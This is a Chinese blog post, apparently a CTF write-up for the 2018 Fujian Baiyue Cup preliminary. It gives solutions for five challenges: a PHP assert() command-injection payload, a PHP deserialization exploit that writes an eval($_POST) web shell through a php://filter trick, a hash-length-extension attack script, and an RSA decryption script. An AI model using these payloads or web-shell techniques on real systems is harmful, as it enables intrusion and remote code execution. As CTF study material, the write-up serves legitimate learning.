@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="baidu-site-verification" content="5ZQsOe30cm" />
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"southsea.st","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqusjs","storage":true,"lazyload":false,"nav":null,"activeClass":"disqusjs"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="太菜了，只能挨打。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018 福建省高校网络空间安全大赛 百越杯 线上初赛 部分题解">
+<meta property="og:url" content="https://southsea.st/2018-BYB-Preliminary/index.html">
+<meta property="og:site_name" content="南溟NaN">
+<meta property="og:description" content="太菜了，只能挨打。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-12-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-24T03:34:53.068Z">
+<meta property="article:author" content="南溟NaN">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://southsea.st/2018-BYB-Preliminary/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://southsea.st/2018-BYB-Preliminary/","path":"2018-BYB-Preliminary/","title":"2018 福建省高校网络空间安全大赛 百越杯 线上初赛 部分题解"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2018 福建省高校网络空间安全大赛 百越杯 线上初赛 部分题解 | 南溟NaN</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">南溟NaN</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在这浩瀚星河的你是什么</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">24</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">68</span></a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-number">1.</span> <span class="nav-text">签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#warmup"><span class="nav-number">2.</span> <span class="nav-text">warmup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#simple-ser"><span class="nav-number">3.</span> <span class="nav-text">simple ser</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B9%B0%E6%89%8B%E6%9C%BA"><span class="nav-number">4.</span> <span class="nav-text">买手机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rsa"><span class="nav-number">5.</span> <span class="nav-text">RSA</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="南溟NaN"
+      src="https://avatars.githubusercontent.com/u/34373144?v=4">
+  <p class="site-author-name" itemprop="name">南溟NaN</p>
+  <div class="site-description" itemprop="description">在这浩瀚星河的你是什么</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/southseast" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;southseast" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:st.southsea@gmail.com" title="E-Mail → mailto:st.southsea@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://southsea.st/2018-BYB-Preliminary/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/34373144?v=4">
+      <meta itemprop="name" content="南溟NaN">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="南溟NaN">
+      <meta itemprop="description" content="在这浩瀚星河的你是什么">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2018 福建省高校网络空间安全大赛 百越杯 线上初赛 部分题解 | 南溟NaN">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2018 福建省高校网络空间安全大赛 百越杯 线上初赛 部分题解
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2018-12-01 00:00:00" itemprop="dateCreated datePublished" datetime="2018-12-01T00:00:00+00:00">2018-12-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E9%A2%98%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">题解</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>太菜了，只能挨打。</p>
+<span id="more"></span>
+<h3 id="签到">签到</h3>
+<p>解数独，找个自动解题的网站就好了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">473615928</span><br><span class="line">216984753</span><br><span class="line">598237164</span><br><span class="line">651892437</span><br><span class="line">942376815</span><br><span class="line">387451296</span><br><span class="line">834529671</span><br><span class="line">125768349</span><br><span class="line">769143582</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cee3860fb3f4a52e615fa8aaf3c91f2b&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="warmup">warmup</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="variable">$i</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>]; </span><br><span class="line">    <span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]!=<span class="string">&quot;Hello World&quot;</span>)&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;die...&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="string">&quot;<span class="subst">$i</span> == <span class="subst">$u</span>&quot;</span>); </span><br><span class="line">    <span class="comment">// TODO </span></span><br><span class="line">    <span class="comment">// echo $flag;  </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>assert</strong>会造成命令执行，只要注释掉后面的语句就行了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=Hello%20World&amp;i=system(%22cat%20flag.php%22);//</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- TODO --&gt;&lt;?php$flag=&#x27;flag&#123;a0572c90-6aab-42c0-a0c7-2fe5fa4442b3&#125;&#x27;;echo &#x27;&lt;!-- TODO --&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+<h3 id="simple-ser">simple ser</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls1</span></span>&#123; </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cls</span>; </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$arr</span>; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;arr <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;cls-&gt;<span class="variable">$v</span>; </span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls2</span></span>&#123; </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$filename</span> = <span class="string">&#x27;hello.php&#x27;</span>; </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$txt</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="string">&#x27;fileput&#x27;</span>)&#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fileput</span>(); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&lt;p&gt;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$key</span>).<span class="string">&#x27;&lt;/p&gt;&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fileput</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(    <span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;filename,<span class="string">&#x27;../&#x27;</span>) !== <span class="literal">false</span> || </span><br><span class="line">            <span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;filename,<span class="string">&#x27;\\&#x27;</span>) !== <span class="literal">false</span>      </span><br><span class="line">        ) <span class="keyword">die</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php die(\&#x27;stupid\&#x27;); ?&gt;&#x27;</span>; </span><br><span class="line">        <span class="variable">$content</span> .= <span class="variable language_">$this</span>-&gt;txt; </span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$content</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$content</span>); </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>))&#123; </span><br><span class="line">    <span class="variable">$cls</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ser&#x27;</span>]); </span><br><span class="line">    <span class="variable">$instance</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cls</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cls1</span>(); </span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>(); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>根据题意，创建一个<strong>cls1</strong>一个<strong>cls2</strong>对象，使得<strong>cls1-&gt;cls=cls2</strong>即可，最后再使用伪协议绕过得以<strong>die()</strong>。</p>
+<p>这里做个笔记，之前<strong>MOCTF</strong>学长出的一道题，死亡退出。</p>
+<p>原理是这里使用伪协议打开<strong>south.php</strong>文件，并将前面的<strong>$content</strong>与后面的<strong>Base64</strong>编码合并解码写入文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$aa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cls1</span>();</span><br><span class="line"><span class="variable">$bb</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cls2</span>();</span><br><span class="line"><span class="variable">$bb</span>-&gt;filename = <span class="string">&quot;php://filter/write=convert.base64-decode/resource=south.php&quot;</span>;</span><br><span class="line"><span class="variable">$bb</span>-&gt;txt = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;&lt;?php @eval(\$_POST[&#x27;south&#x27;]);?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$aa</span>-&gt;arr = <span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">&quot;fileput&quot;</span>);</span><br><span class="line"><span class="variable">$aa</span>-&gt;cls = <span class="variable">$bb</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>).<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;ser=&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>)).<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>此处由于<strong>Base64</strong>的特性，即四个字节为一组解码，且编码字符为大小写字符和数字以及<strong>+</strong>、<strong>/</strong>，因此此处的<strong>&lt;?php
+die('stupid');
+?&gt;</strong>有效字符只有<strong>12</strong>位，刚好够解码干扰前面的死亡代码，若只有不足<strong>4N</strong>位则需自己添加有效字符凑齐，那么并上后面的<strong>Base64</strong>编码的恶意代码一同解码，就会得到<strong>暝髭꘿i暼?php
+system('cat
+flag.php');?&gt;</strong>这样的内容写入文件中，从而<strong>Getshell</strong>，而最后<strong>payload</strong>如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ser=Tzo0OiJjbHMxIjoyOntzOjM6ImNscyI7Tzo0OiJjbHMyIjoyOntzOjg6ImZpbGVuYW1lIjtzOjU5OiJwaHA6Ly9maWx0ZXIvd3JpdGU9Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPXNvdXRoLnBocCI7czozOiJ0eHQiO3M6NDQ6IlBEOXdhSEFnUUdWMllXd29KRjlRVDFOVVd5ZHpiM1YwYUNkZEtUcy9QZz09Ijt9czozOiJhcnIiO2E6MTp7aToxO3M6NzoiZmlsZXB1dCI7fX0=</span><br></pre></td></tr></table></figure>
+<p>连🐎。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b722fe16-38d7-4969-aa2e-e907e69982e2&#125; </span><br></pre></td></tr></table></figure>
+<h3 id="买手机">买手机</h3>
+<p><strong>RCTF</strong>的原题，<strong>Cpushop</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">import hashpumpy</span><br><span class="line"> </span><br><span class="line">p = remote(&#x27;117.50.13.182&#x27;,8888)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line">p.recvuntil(&quot;Product ID: &quot;)</span><br><span class="line">p.sendline(&quot;9&quot;)</span><br><span class="line"></span><br><span class="line">payment = p.recv()</span><br><span class="line">sp = payment.find(&#x27;&amp;sign=&#x27;)</span><br><span class="line">sign = payment[sp+6:]</span><br><span class="line">sign = sign[:sign.find(&#x27;\n&#x27;)]</span><br><span class="line">payment = payment[payment.find(&#x27;product&#x27;):payment.find(&#x27;&amp;sign&#x27;)]</span><br><span class="line"> </span><br><span class="line">for keylen in range(8,32):</span><br><span class="line">	log.info(&#x27;trying keylen=&#x27;+str(keylen))</span><br><span class="line"> </span><br><span class="line">	n = hashpumpy.hashpump(sign, payment, &#x27;&amp;price=1&#x27;, keylen)</span><br><span class="line">	order = n[1] + &quot;&amp;sign=&quot;+n[0]</span><br><span class="line"> </span><br><span class="line">	p.sendline(&quot;3&quot;)</span><br><span class="line">	p.recvuntil(&quot;Your order:&quot;)</span><br><span class="line"> 	p.sendline(order)</span><br><span class="line">	p.recv(1000)</span><br><span class="line">  	ret = p.recv(1000)</span><br><span class="line">  	if (&quot;Invalid&quot; not in ret):</span><br><span class="line">    	print(ret)</span><br><span class="line">    	print(p.recvuntil(&quot;Money: &quot;))</span><br><span class="line">    	quit()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Hash_leNgth_eXt3ns1on_attack_!S)_E@sy&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="rsa">RSA</h3>
+<p>CTFWIKI上有原题，由于<strong>pq</strong>搞反了，导致跑了一天都没跑出来。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 </span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_RSA</span>(<span class="params">cipherfile</span>):</span><br><span class="line">    n = <span class="number">62078208638445817213739226854534031566665495569130972218813975279479576033261</span> 	</span><br><span class="line">    e = <span class="number">9850747023606211927</span> 	</span><br><span class="line">    p = <span class="number">336771668019607304680919844592337860739</span> 	</span><br><span class="line">    q = <span class="number">184333227921154992916659782580114145999</span> 	</span><br><span class="line">    cipher = <span class="built_in">open</span>(cipherfile, <span class="string">&quot;r&quot;</span>).read() 	</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: 		</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># key = open(privkey, &quot;r&quot;).read()</span></span><br><span class="line">            phi = (p - <span class="number">1</span>)*(q - <span class="number">1</span>)</span><br><span class="line">            d = gmpy2.invert(e, phi)</span><br><span class="line">            <span class="comment"># pubkey = RSA.construct((long(n), long(e)))</span></span><br><span class="line">            privkey = RSA.construct((long(n), long(e), long(d)))</span><br><span class="line">            key = PKCS1_v1_5.new(privkey)</span><br><span class="line">            decrypted = key.decrypt(base64.b64decode(cipher), <span class="literal">None</span>)</span><br><span class="line">            <span class="built_in">print</span> decrypted</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">            <span class="built_in">print</span> ex</span><br><span class="line">            p = gmpy2.next_prime(p**<span class="number">2</span> + q**<span class="number">2</span>)</span><br><span class="line">            q = gmpy2.next_prime(<span class="number">2</span>*p*q)</span><br><span class="line">            e = gmpy2.next_prime(e**<span class="number">2</span>)</span><br><span class="line">            n = long(p)*long(q)</span><br><span class="line">decrypt_RSA(<span class="string">&quot;flag.enc&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>得到<strong>flag</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f@cToR__N_bY_!teratlnG!&#125;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
